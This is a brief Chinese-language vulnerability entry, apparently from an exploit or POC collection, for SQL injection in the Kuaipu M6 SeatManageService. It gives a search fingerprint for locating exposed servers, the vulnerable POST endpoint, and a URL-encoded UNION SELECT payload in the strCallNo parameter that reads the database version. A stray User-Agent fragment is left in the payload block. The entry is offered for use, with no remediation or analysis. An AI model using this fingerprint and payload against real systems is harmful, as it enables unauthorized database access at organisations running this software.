# 快普M6SeatManageService存在SQL注入漏洞

快普 ｜ SQL注入 ｜ —
- **指纹**：`body="Resource/JavaScript/jKPM6.DateTime.js"`
- **请求**：`POST /WebService/SeatManageService.asmx/GetCallInfo HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
strCallNo=a%27+UNION+ALL+SELECT+NULL%2CNULL%2C%40%40VERSION--
```
- **响应特征**：500